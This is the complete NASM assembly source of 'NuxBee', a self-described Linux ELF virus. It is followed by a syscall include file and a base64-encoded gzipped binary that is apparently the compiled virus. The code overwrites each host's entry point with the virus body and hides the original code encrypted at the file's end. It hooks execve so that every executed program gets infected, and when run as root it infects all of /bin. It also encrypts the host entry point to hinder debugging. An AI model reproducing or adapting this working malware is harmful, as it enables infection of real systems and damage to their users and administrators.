
;
; NuxBee rel2
; Coded by Bumblebee
;
; That's my 1st ELF infector released so don't keen on me :)
; Unix systems are as good as other environment to code a virus. We know
; the main problem is the spread, quite impossible. Well... we are here
; just for fun, so let's go and show what can be done in assembler.
; Let's go to the next frontier.
;
; Some features:
;
;  . Infection method it's 'not strip resistant', uh :/
;  . It's per-process resident by patching PLT entry for 'execve' at
;    run-time (if available).
;  . Uses some features common under win32 viruses such as: memory mapped
;    files, CRC32 instead of strigz for hooks, ...
;  . Direct action aganist /bin folder if euid is 0 (the idea is to
;    infect as much shells as possible).
;  . It doesn't changes the headers at all. Uses mprotect syscall to change
;    the page where virus stands to be writable and restore host code. It 
;    just looks for host EP and puts virus code there. The original code is 
;    stored (encrypted) at the end of file. For correct execution of the host
;    the virus must locate the host file (looking local folder and PATH
;    folders), load that code, decrypt it and restore the host in memory.
;    Then it can jmp host ep to run host it.
;  . Anti-debug features: encrypts host ep addr with CRC32 of virus code at
;    infection time, and decrypts calculating CRC32 again at run-time.
;  . Coded using NASM syntax.
;
; What's new?
;
;  . Lil' bug inside '/bin' infection fixed.
;
;   DEV SYSTEM: Mandrake 7.1 (Kernel 2.2.16) partial test
;  TEST SYSTEM: Mandrake 6.1 (Kernel 2.2.11) full test
;
; the way of the bee
;

; include with some equs
%include"linux.inc"

bits 32
section .data

	msg	db	0xa,"NuxBee by Bumblebee activated.",0xa
		db	"Have a nice day!",0xa
	len	equ	$-msg

	strz	db	'execve',0

section .text

	global _start

_start:
	; setup fake 1st gen
	push	dword fakeHost
	pusha
        mov     ebx,_start
        and     ebx,0fffff000h
        mov     ecx,2000h
        mov     edx,7h
	mov	eax,_mprotect
        int     0x80

	push	dword 7
	push	dword strz
	call	CRC32
	mov	[funcHook],eax

	call	getDelta
	jmp	directAction
inicio:
	pusha

	call	getDelta			; get delta offset

	; get heap
	push	dword 0				; offset 0
	push	dword -1			; file hnd none
	push	dword 22h			; map_private and map_anonymous
	push	dword 7				; read|write|exec
	push	dword (vfinal-inicio)		; heap size
	push	dword 0				; null
	mov	ebx,esp
	mov	eax,_mmap			; map mem
	int	0x80
	add	esp,6*4

	mov	edi,eax				; copy virus there
	lea	esi,[inicio+ebp]
	mov	ecx,(final-inicio)
	rep	movsb

	; goto mem copy
	add	eax,inMemory-inicio
	jmp	eax
inMemory:
	call	getDelta			; get delta again

	lea	eax,[inicio+ebp]
	push	dword (final-inicio)
	push	eax
	call	CRC32
	xor	[esp+20h],eax			; decrypt host EP

        mov     ebx,[esp+20h]			; get host page
        and     ebx,0fffff000h
        mov     ecx,2000h			; change 2 pages
        mov     edx,7h
	mov	eax,_mprotect			; change protections
        int     0x80

	mov	ebx,[esp+28h]			; try to open host

	xor	ecx,ecx
	mov	eax,_open
	int	0x80
	dec	eax
	jns	openHostOk
	jmp	tryPath				; if fails, try searching
openHostOk:					; into PATH env variable
	inc	eax
	mov	ebx,eax
	mov	edx,2
	mov	ecx,-((final-inicio)+5)
	mov	eax,_lseek
	int	0x80				; goto eof - vsize

	mov	ecx,[esp+20h]			; restore host
	push	ecx
	mov	edx,(final-inicio)+5
	mov	eax,_read
	int	0x80

	mov	eax,_close
	int	0x80

	pop	esi				; decrypt host code
	mov	eax,esi
	mov	ecx,((final-inicio)+5)/4
decHostCode:
	xor	[esi],eax
	rol	eax,1
	add	esi,4
	loop	decHostCode

hostRestored:
	mov	ebx,[pltAddr+ebp]		; get plt calculated at
						; infection time
	or	ebx,ebx
	jz	directAction

	mov	ebx,[ebx+2]
        and     ebx,0fffff000h
        mov     ecx,2000h			; change 2 pages
        mov     edx,7h
	mov	eax,_mprotect			; change protections
        int     0x80

	mov	esi,[pltAddr+ebp]		; get plt again
	mov	[nhook+ebp],esi			; save addr
	mov	esi,[esi+2]
	lea	eax,[hook+ebp]
	xchg	eax,[esi]			; hook!
	mov	[ohook+ebp],eax			; save old value

directAction:

	mov	eax,_geteuid
	int	0x80				; get euid
	or	eax,eax
	jz	scanBinFolder			; bah!
	jmp	jmpHost

scanBinFolder:
	; now it's the moment to penetrate the system
	; probably we've waited long time, so infect all
	; /bin folder to be sure we touch a shell

	xor	eax,eax
	push	eax
	mov	eax,~'/bin'
	not	eax
	push	eax
	xor	ecx,ecx
	mov	ebx,esp
	mov	eax,_open
	int	0x80				; open the folder
	add	esp,8				; quit string from stack

	dec	eax
	js	jmpHost				; what da fuck?!?
	inc	eax
	push	eax				; save handle

	mov	ebx,eax				; dir handle
	lea	ecx,[buffer+ebp+1000h]
	push	ecx				; buffer + 1000h
	mov	edx,1000h			; 4 kbs
	mov	eax,_getdents
	int	0x80				; get directory entries
	pop	esi

	dec	eax
	js	closeTheFolder			; uh?
	inc	eax

	mov	edx,eax				; save limit
	xor	ecx,ecx
infectFolderLoop:
	lea	edi,[esi+ecx+0ah]		; get filename
	cmp	byte [edi],'.'			; skip shit
	je	nextDirEnt

	push	esi				; build the string
	lea	esi,[strBuff+ebp]		; build '/bin/'
	mov	dword [esi],~'/bin'
	not	dword [esi]
	mov	byte [esi+4],'/'
	add	esi,5
	xchg	esi,edi
strBuildLoop:
	movsb					; copy filename
	cmp	byte [esi-1],0
	jne	strBuildLoop
	pop	esi

	lea	ebx,[strBuff+ebp]		; put filename into ebx
	call	infect				; huehahaha

nextDirEnt:
	sub	dx,[esi+ecx+8]			; sub this one
	add	cx,[esi+ecx+8]			; goto next one
	or	edx,edx
	jnz	infectFolderLoop

closeTheFolder:
	pop	ebx
	mov	eax,_close
	int	0x80				; close the folder

jmpHost:
	popa					; go back host
	ret

	; if not in current directory just look for the host
	; in folders listed into PATH env variable
tryPath:
	mov	edi,esp				; get env **
	add	edi,28h
	mov	eax,[esp+24h]
	inc	eax
	mov	cx,4
	mul	cx
	add	edi,eax
	mov	esi,[edi]
	jmp	pathLoop

pathLoop0:					; look for 'PATH='
	add	edi,4
	mov	esi,[edi]
pathLoop:
	mov	eax,~'PATH'
	not	eax
	cmp	dword [esi],eax
	jne	pathLoop0

	cmp	byte [esi+4],'='
	jne	pathLoop0

	add	esi,5				; now look for the host
getPathLoop0:					; folder
	xor	edx,edx
	lea	edi,[buffer+ebp]
getPathLoop:
	movsb

	cmp	byte [esi-1],'\'
	je	getPathLoop
	cmp	byte [edi-1],':'		; end of PATH?
	je	checkThis	
	cmp	byte [edi-1],0			; last PATH?
	je	checkThis
	jmp	getPathLoop

checkThis:					; append /<host filename>
	dec	edi				; or just try to open
	or	edx,edx				; if already added
	jnz	tryOpenNow
	push	esi				; save search pointer
	mov	al,'/'
	stosb
	mov	esi,[esp+2ch]
	inc	edx
	jmp	getPathLoop

tryOpenNow:
	pop	esi				; restore the pointer
						; of PATH search (may be
						; that's not the folder)
	lea	ebx,[buffer+ebp]
	xor	ecx,ecx
	mov	eax,_open
	int	0x80				; you're there?!
	dec	eax
	js	getPathLoop0			; try next path entry
	jmp	openHostOk			; yeah :)

; uh? what does this routine? ;)
infect:
	pusha
	mov	ecx,2
	mov	eax,_open
	int	0x80				; open the file to infect
	dec	eax
	jns	openOk
	jmp	infError
openOk:
	inc	eax
	mov	[fHnd+ebp],eax			; save file handle
	mov	ebx,eax

	xor	ecx,ecx
	mov	edx,2
	mov	eax,_lseek
	int	0x80				; goto eof and get file size
	mov	[fileSize+ebp],eax		; save file size

	push	dword 0				; offset 0
	push	ebx				; file hnd
	push	dword 1				; map_private
	push	dword 3				; read|write
	push	eax				; file size
	push	dword 0				; null
	mov	ebx,esp
	mov	eax,_mmap			; map file
	int	0x80
	add	esp,6*4

	dec	eax
	jns	mapOk
	jmp	infErrorClose
mapOk:
	inc	eax
	mov	[ebp+mMap],eax
	mov	edx,eax

	mov	ax,[edx+2]
	sub	al,ah
	cmp	al,'L'-'F'			; check it's ELF
	jne	infErrorCloseUmap

	cmp	word [edx+10h],2		; executable file?
	jne	infErrorCloseUmap

	cmp	word [edx+12h],3		; check machine type
	je	i386ok
	cmp	word [edx+12h],6
	jne	infErrorCloseUmap
i386ok:
	jmp	checksOk			; file is nice to infect

infErrorCloseUmap:
	mov	ecx,[fileSize+ebp]
	mov	ebx,[mMap+ebp]
	mov	eax,_munmap
	int	0x80

infErrorClose:
	mov	ebx,[fHnd+ebp]
	mov	eax,_close
	int	0x80
infError:
	popa
	ret

	; checks are done: now just infect the file
checksOk:

	; look for our segment
	mov	esi,[edx+1ch]
	add	esi,edx

	movzx	edi,word [edx+2ch]		; get entry count
readNextEntry:
	mov	eax,[esi+8h]			; look for ep segment
	cmp	eax,[edx+18h]			; and check has enought
	ja	moreEntries			; size for virus body
	add	eax,[esi+10h]
	cmp	eax,[edx+18h]
	jb	moreEntries
	sub	eax,[edx+18h]
	cmp	eax,(final-inicio)+5
	ja	segFound
	jmp	infErrorCloseUmap
moreEntries:
	add	esi,20h
	dec	di
	jnz	readNextEntry

	jmp	infErrorCloseUmap

segFound:
	mov	edi,[edx+18h]			; calc file addr of ep
	sub	edi,[esi+8h]
	add	edi,[esi+4h]
	add	edi,edx

	cmp	byte [edi+5],60h		; pusha?
	jne	notInfected
	jmp	infErrorCloseUmap
notInfected:
	mov	esi,edi

	lea	edi,[buffer+ebp]

	push	esi				; get host code
	mov	ecx,(final-inicio)+5
	rep	movsb
	pop	esi

	lea	edi,[ebp+inicio]

	xchg	esi,edi

	mov	al,68h
	stosb

	; now look for got addr for the desired func to hook
	; i calc this stuff right now for simplicity
	; notice this step is not as easy as at win32 platforms
	; due two points:
	; 1. we cannot know where the hell are the addr fot the funcs
	; 2. most likely the dynamic linker will fill import address alike
	;    structures when needed, not at loading time
	;
	; So i look for plt addr of 'execve' at infection time, to make
	; the hook later, at runtime.
	;
	pusha

	xor	eax,eax
	mov	[shs+ebp],eax
	mov	[shs+ebp+4],eax
	mov	[pltAddr+ebp],eax		; init to 0

	mov	esi,[edx+20h]			; section header
	add	esi,edx
	movzx	edi,word [edx+34h]		; get entry count
readNextShEntry:

	cmp	[esi+4],dword 11		; DYNSYM?
	je	shFound0

	cmp	[esi+4],dword 3			; STRTAB?
	je	shFound1

moreShEntries:
	add	esi,28h
	dec	di
	jnz	readNextShEntry

	jmp	noHook

shFound0:
	mov	[shs+ebp],esi			; store DYNSYM addr
	mov	eax,[shs+ebp+4]
	jmp	isShDone
shFound1:
	mov	[shs+ebp+4],esi			; store STRTAB
	mov	eax,[shs+ebp]
isShDone:
	or	eax,eax
	jz	moreShEntries
shOk:
	mov	esi,[shs+ebp]			; DYNSYM
	mov	edi,[shs+ebp+4]			; STRTAB
	mov	ecx,[esi+14h]			; section size
	mov	ebx,[esi+24h]			; entry size
	mov	esi,[esi+10h]
	add	esi,edx				; goto 1st entry
	mov	edi,[edi+10h]
	add	edi,edx				; begin of table

enumFuncsLoop:					; look for the func
	push	esi
	mov	esi,[esi]			; get index into table
	add	esi,edi				; get string

	push	dword 7
	push	esi
	call	CRC32				; check func name
	sub	eax,12345678h
funcHook	equ $-4
	jz	funcFound

	pop	esi
	add	esi,ebx				; if not found check
	sub	ecx,ebx				; next
	jnz	enumFuncsLoop

	jmp	noHook
funcFound:
	pop	esi

	mov	eax,[esi+4]
	mov	[pltAddr+ebp],eax		; save its virt addr!
noHook:
	popa

	push	dword (final-inicio)
	lea	eax,[inicio+ebp]
	push	eax
	call	CRC32				; calc CRC32

	mov	ecx,eax
	mov	eax,[edx+18h]			; encrypt host ep
	xor	eax,ecx
	stosd					; save host ep
	xor	eax,ecx				; restore host ep

	mov	ecx,(final-inicio)
	rep	movsb				; put virus body

	lea	esi,[buffer+ebp]		; encrypt host code
	mov	ecx,((final-inicio)+5)/4
encHostCode:
	xor	[esi],eax			; eax has host ep
	rol	eax,1
	add	esi,4
	loop	encHostCode
	
	mov	ecx,[fileSize+ebp]		; get file size

	mov	edx,4
	mov	ebx,[mMap+ebp]
	mov	eax,_msync
	int	0x80				; flush changes to disk

	mov	eax,_munmap
	int	0x80				; unmap mem addr

	mov	edx,2
	xor	ecx,ecx
	mov	ebx,[fHnd+ebp]
	mov	eax,_lseek
	int	0x80				; goto eof

	mov	edx,(final-inicio)+5
	lea	ecx,[buffer+ebp]
	mov	eax,_write
	int	0x80				; save host code

	jmp	infErrorClose

getDelta:
	call	delta
copyright	db	0xa,"NuxBee by Bumblebee - The NeXt Frontier",0xa
delta:
	pop	ebp
	sub	ebp,copyright			; calc delta offset
	ret
;
; That routine is the same than in win32 systems :)
;
CRC32:
        push    ebp
        mov     ebp,esp
        push    esi
	push	edi
	push	ecx
	push	edx
	push	ebx

        mov     esi,dword [ebp+8]
        mov     edi,dword [ebp+12]

	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
        pop     ebx 
	pop	edx 
	pop	ecx 
	pop	edi 
	pop	esi
        pop     ebp
        retn    8

; that's our execve hook. notice we must return in case the execve call
; fails. if all goes nice, there is no return hehehe
hook:
	push	eax
	pusha
	call	getDelta

	mov	ebx,[esp+28h]
	call	infect				; infect it

	mov	esi,[nhook+ebp]			; get plt addr
	mov	[esp+20h],esi			; setup call addr

	mov	esi,[esi+2]
	mov	eax,[ohook+ebp]
	mov	[esi],eax			; restore func

	lea	eax,[hookRetAddr+ebp]
	xchg	[esp+24h],eax
	mov	[oldRetAddr+ebp],eax		; change ret addr

	popa
	pop	eax
	jmp	eax				; call func
hookRetAddr:
	pusha

	call	getDelta
	
	mov	eax,[oldRetAddr+ebp]
	mov	[esp+20h],eax			; restore ret addr

	mov	esi,[nhook+ebp]			; restore hook
	mov	esi,[esi+2]
	mov	eax,[ohook+ebp]

	cmp	[esi],eax			; check ld workz
	je	hookIsOk
	mov	eax,[esi]
	mov	[ohook+ebp],eax			; update hook
hookIsOk:
	lea	eax,[hook+ebp]
	mov	[esi],eax

	popa					; go back host
	ret

pltAddr		dd	0

; here begins virtual data of the virus
final:

fileSize	dd	0
fHnd		dd	0
mMap		dd	0

shs		dd	0,0
nhook		dd	0
ohook		dd	0
oldRetAddr	dd	0

strBuff		times	256 db 0

buffer		times	2000h db 0
vfinal:

	; a fake host for 1st gen, just shows a message and exits
fakeHost:
	mov	edx,len
	mov	ecx,msg
	mov	ebx,1
	mov	eax,_write
	int	0x80

	mov	ebx,0
	mov	eax,_exit
	int	0x80

-- linux.inc cut here --
;
;    Some useful stuff for linux assembly
;    Copyright (C) 2000 Bumblebee
;
;    This file is free software; you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation; either version 2 of the License, or
;    (at your option) any later version.
;
;    This file is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this file; if not, write to the Free Software Foundation, 
;    Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
;
; Contents:
;
;	.system calls list
;

;
; _syscall list
;
; You can check /usr/include/asm/unistd.h but i think here are
; enougth syscalls :) Check man section 2, and remember linux is
; a POSIX system (do you know what is a POSIX system?)
;

_exit		equ		1
_fork		equ		2
_read		equ		3
_write		equ		4
_open		equ		5
_close		equ		6
_waitpid	equ		7
_creat		equ		8
_link		equ		9
_unlink		equ		10
_execve		equ		11
_chdir		equ		12
_time		equ		13
_mknod		equ		14
_chmod		equ		15
_lchown		equ		16
_break		equ		17
_oldstat	equ		18
_lseek		equ		19
_getpid		equ		20
_mount		equ		21
_umount		equ		22
_setuid		equ		23
_getuid		equ		24
_stime		equ		25
_ptrace		equ		26
_alarm		equ		27
_oldfstat	equ		28
_pause		equ		29
_utime		equ		30
_stty		equ		31
_gtty		equ		32
_access		equ		33
_nice		equ		34
_ftime		equ		35
_sync		equ		36
_kill		equ		37
_rename		equ		38
_mkdir		equ		39
_rmdir		equ		40
_dup		equ		41
_pipe		equ		42
_times		equ		43
_prof		equ		44
_brk		equ		45
_setgid		equ		46
_getgid		equ		47
_signal		equ		48
_geteuid	equ		49
_getegid	equ		50
_acct		equ		51
_umount2	equ		52
_lock		equ		53
_ioctl		equ		54
_fcntl		equ		55
_mpx		equ		56
_setpgid	equ		57
_ulimit		equ		58
_oldolduname	equ		59
_umask		equ		60
_chroot		equ		61
_ustat		equ		62
_dup2		equ		63
_getppid	equ		64
_getpgrp	equ		65
_setsid		equ		66
_sigaction	equ		67
_sgetmask	equ		68
_ssetmask	equ		69
_setreuid	equ		70
_setregid	equ		71
_sigsuspend	equ		72
_sigpending	equ		73
_sethostname	equ		74
_setrlimit	equ		75
_getrlimit	equ		76
_getrusage	equ		77
_gettimeofday	equ		78
_settimeofday	equ		79
_getgroups	equ		80
_setgroups	equ		81
_select		equ		82
_symlink	equ		83
_oldlstat	equ		84
_readlink	equ		85
_uselib		equ		86
_swapon		equ		87
_reboot		equ		88
_readdir	equ		89
_mmap		equ		90
_munmap		equ		91
_truncate	equ		92
_ftruncate	equ		93
_fchmod		equ		94
_fchown		equ		95
_getpriority	equ		96
_setpriority	equ		97
_profil		equ		98
_statfs		equ		99
_fstatfs	equ		100
_ioperm		equ		101
_socketcall	equ		102
_syslog		equ		103
_setitimer	equ		104
_getitimer	equ		105
_stat		equ		106
_lstat		equ		107
_fstat		equ		108
_olduname	equ		109
_iopl		equ		110
_vhangup	equ		111
_idle		equ		112
_vm86old	equ		113
_wait4		equ		114
_swapoff	equ		115
_sysinfo	equ		116
_ipc		equ		117
_fsync		equ		118
_sigreturn	equ		119
_clone		equ		120
_setdomainname	equ		121
_uname		equ		122
_modify_ldt	equ		123
_adjtimex	equ		124
_mprotect	equ		125
_sigprocmask	equ		126
_create_module	equ		127
_init_module	equ		128
_delete_module	equ		129
_get_kernel_syms equ		130
_quotactl	equ		131
_getpgid	equ		132
_fchdir		equ		133
_bdflush	equ		134
_sysfs		equ		135
_personality	equ		136
_afs_syscall	equ		137
_setfsuid	equ		138
_setfsgid	equ		139
__llseek	equ		140
_getdents	equ		141
__newselect	equ		142
_flock		equ		143
_msync		equ		144
_readv		equ		145
_writev		equ		146
_getsid		equ		147
_fdatasync	equ		148
__sysctl	equ		149
_mlock		equ		150
_munlock	equ		151
_mlockall	equ		152
_munlockall	equ		153
_sched_setparam	equ		154
_sched_getparam	equ		155
_sched_setscheduler equ		156
_sched_getscheduler equ		157
_sched_yield	equ		158
_sched_get_priority_max	equ	159
_sched_get_priority_min	equ	160
_sched_rr_get_interval	equ	161
_nanosleep	equ		162
_mremap		equ		163
_setresuid	equ		164
_getresuid	equ		165
_vm86		equ		166
_query_module	equ		167
_poll		equ		168
_nfsservctl	equ		169
_setresgid	equ		170
_getresgid	equ		171
_prctl          equ		172
_rt_sigreturn	equ		173
_rt_sigaction	equ		174
_rt_sigprocmask	equ		175
_rt_sigpending	equ		176
_rt_sigtimedwait equ		177
_rt_sigqueueinfo equ		178
_rt_sigsuspend	equ		179
_pread		equ		180
_pwrite		equ		181
_chown		equ		182
_getcwd		equ		183
_capget		equ		184
_capset		equ		185
_sigaltstack	equ		186
_sendfile	equ		187
_getpmsg	equ		188
_putpmsg	equ		189
_vfork		equ		190
_mmap2		equ		192
_truncate64	equ		193
_ftruncate64	equ		194
_stat64		equ		195
_lstat64	equ		196
_fstat64	equ		197

-- nuxbee.bin.gz cut here --

begin-base64 644 nuxbee.bin.gz
H4sICAOXrTsAA251eGJlZS5iaW4A7VpvaBxFFJ+77J2btKSxRg1ocSuHSUmb
upJaW62Gsz3SUtLrH681ac+7NHdcxFRIdtNLsMkd9UyXccF+URCigoVKK1g/
pNm7ELkkmj+ikgTSqAWJbaW3lEKxwlHRnO/NbtqCLfjd+cHuvHnz5r2Z92c+
vd5tO30Oh4MswUmKCM4SCUGshfFKpcWvJRKsVREXEchtaZDBLwEy+LmQV0as
/cgbhDX4noM5fm57/W7EgqcFMTSE5pKXyY1CIQ2GSOYBWDKOwe/7RAzp2Jeg
J/eNQMinn7wNVAoosxwMhXLdQMaYqgIg9iRSbMtHT9kL2mWjkalKfl2B0wl9
IAv20j1w4JunXNuBV1jIPQN69BQuxHDBn9sPDHmrR6IHPdJ9zgZLVfKU4WKT
+i6X+QQcqU4byziBkz72Z6FgPGQJ7vRIuzPHQdAoYgzDzYagdiMdgj2yeyab
HAeD5NIftH/zO4JYfFHZSJuc9zM8gDLawB74006nnvouJYh9bi0VAIYhM5ni
rOIy3wVSzvqN6f73T+an/fIUOMNlO0OEsT7eVufXxnQ9+IEg7s5geAzdOlp9
fEedNipP6W+VliReqlFqAvpAENRPuJmyR8Z9wvrkOCrry59K9BSIeiuo96NE
7mNgRqv3lYrRop2lYvGsOtRkXzg8pl1NTlQBTbd6PHXRtECi+V8dE3SjicdJ
TqAP6Ebji6/ODuanN7nV64keYYt61TIkz+rDwT5BRHMHlVuJ3sJmZRn8Cdw0
B9HfBaZKA+fWn6GKZ63XnAMWHgl23IlSPGM2LhYKoTTG6K7QfUgwdCkv+nVM
nmIhtKOnpV4ELsulvTHM7hgG0X+v5EJNL1uafKhpNEq9zqqFF9zqqmiyu8xJ
1IdhXFlEFBFHN1FdJqYs1dEE7cdNRpMV4348y22/0fbHHRdWDHavpT7xeW/F
0UeLfGUwtq+o9lZswcw6Wm6ehwsnxyX0/i513jwNU9pdUd0jFvUIjvlErysE
5k4CV1u0HBlIH2dFENSHMfP78udiZ0JyVkvtwMOnGtgfU422S8x6bbJHWAb6
lQog0AuKlByvsgxeMV9HhwzgXsr2mssZo4ExkA05OU0tgWHGbSinQQ/tLHNc
oL1ljvkAfdaxyMo3kJuH/7p4oHalsjzo+GXNT+olswRYQeoTrDOFWaFaNevP
fYamRqi3Qp48K0/axQ0ZC7f8d4kxb2dYrlkuf8+qSsvzLPbylB0AKwdY8UKZ
gDpDYByzCdIotwbokgY17o1EpOYuyau2Nb8RaYbJOmlfLCI1RA4okq/9zSNK
a6S95FDy+jYo1LFXtN8C+3fv2UtVkR5b/pc8tV37dq+clS9+/vTkCfPE3Inf
z4vRmWvRmR87iqMbpOPR5E3j+uIP6jV5RP55lzrXlJ/Nz2jTI9myqDbZ1Pjq
a8FDoyLxh3JtGHF4lHKr/gaCPQ+aAk9Yp5Oyp0Fz6ykXjH1QfFqqEZ14oLAQ
ym3AfWyu4Yu39K5Ymza5FZHab4v10mju8Bjh4ODg4ODg4ODg4ODg4ODg4ODg
4ODg4ODg4ODg4ODg4PgfIIOdWGnsgRvCtiG7cWQIlwwHo+/ZOhI+rLR2hpVI
S01JfbgT5tKR1sMRqSXctbokEo8c7owQUtPR1aaEm2FU2q0xtkQpkbhCalrC
SpjUNHd0/OfTPkas3j3sOMKGvAQyK++sL7XurbblsP2H9fhVWv19SxDssdKW
Y1cHOeMuXcTmIx60dS0B5dbeQ+4fq0DzhqwoAAA=
====

-- EOF --
